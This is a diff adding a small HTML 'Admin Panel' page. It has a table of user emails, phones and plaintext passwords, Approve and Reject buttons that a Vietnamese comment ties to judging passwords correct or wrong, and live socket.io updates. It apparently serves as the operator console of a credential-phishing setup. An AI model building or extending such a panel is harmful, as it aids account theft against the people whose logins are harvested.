@@ -1,0 +1,35 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Admin Panel</title>
+    <link rel="stylesheet" href="/style.css">
+</head>
+<body>
+    <h1>Admin Panel</h1>
+    <h3>Users Data</h3>
+    
+    <!-- Bảng hiển thị thông tin người dùng -->
+    <table id="user-table" border="1">
+        <thead>
+            <tr>
+                <th>Email</th>
+                <th>Phone</th>
+                <th>Password</th>
+                <th>Action</th>
+            </tr>
+        </thead>
+        <tbody>
+            <!-- Các hàng sẽ được thêm vào đây -->
+        </tbody>
+    </table>
+
+    <!-- Nút xử lý đúng/sai mật khẩu -->
+    <button id="approve-btn">Approve</button>
+    <button id="reject-btn">Reject</button>
+
+    <script src="/socket.io/socket.io.js"></script>
+    <script src="/admin.js"></script>
+</body>
+</html>
